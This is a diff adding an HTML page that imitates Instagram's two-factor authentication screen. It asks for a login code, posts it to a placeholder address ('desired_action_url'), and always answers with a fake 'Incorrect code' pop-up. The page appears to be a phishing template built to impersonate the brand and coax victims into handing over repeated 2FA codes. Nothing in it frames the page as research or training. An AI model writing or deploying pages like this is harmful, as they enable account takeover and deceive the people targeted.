@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Two-Factor Authentication</title>
+  <style>
+    /* Styles for the form */
+    body {
+      font-family: 'Helvetica Neue', sans-serif;
+      background-color: #fafafa;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      max-width: 350px;
+      margin: 80px auto;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+    }
+
+    h2 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 30px;
+      color: #262626;
+    }
+
+    form {
+      margin-top: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 10px;
+      color: #262626;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background-color: #fafafa;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #2680d6;
+    }
+
+    /* Styles for the pop-up */
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      display: none;
+    }
+
+    .popup p {
+      margin: 0;
+      color: #262626;
+    }
+
+    .popup button {
+      padding: 10px;
+      background-color: #3897f0;
+      color: #fff;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    .popup button:hover {
+      background-color: #2680d6;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Instagram Two-Factor Authentication</h2>
+    <form id="authForm" action="desired_action_url" method="post">
+      <label for="code">Authentication Code:</label>
+      <input type="text" id="code" name="code" required>
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+
+  <!-- Pop-up message -->
+  <div class="popup" id="popup">
+    <p>Incorrect code. Please check and try again.</p>
+    <button onclick="closePopup()">OK</button>
+  </div>
+
+  <script>
+    // Function to show the pop-up
+    function showPopup() {
+      document.getElementById('popup').style.display = 'block';
+    }
+
+    // Function to close the pop-up
+    function closePopup() {
+      document.getElementById('popup').style.display = 'none';
+    }
+
+    // Event listener for form submission
+    document.getElementById('authForm').addEventListener('submit', function(event) {
+      event.preventDefault(); // Prevent form submission
+      showPopup(); // Show the pop-up
+    });
+  </script>
+</body>
+</html>
